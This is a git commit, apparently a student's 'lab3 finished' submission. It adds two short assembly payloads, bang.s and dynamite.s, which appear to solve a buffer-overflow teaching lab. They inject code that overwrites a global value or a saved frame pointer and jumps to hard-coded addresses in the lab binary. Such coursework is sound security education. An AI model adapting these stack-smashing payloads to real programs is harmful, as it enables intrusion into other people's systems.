9d286dadde419207a3051d58226ec4a0fef5faba
Urinx <1336006643@qq.com>
2014-09-28 19:15:36 +0800

    lab3 finished

---
+++ lab3/bang.s
@@ -0,0 +1,5 @@
+movabs $0x4c3917bc152e13ab,%rax
+mov $0x602308,%rbx
+mov %rax,(%rbx)
+pushq $0x401020
+retq
---
+++ lab3/dynamite.s
@@ -0,0 +1,4 @@
+movabs $0x4c3917bc152e13ab,%rax
+mov $0x7fffffffb780,%rbp
+pushq $0x400ef3
+retq
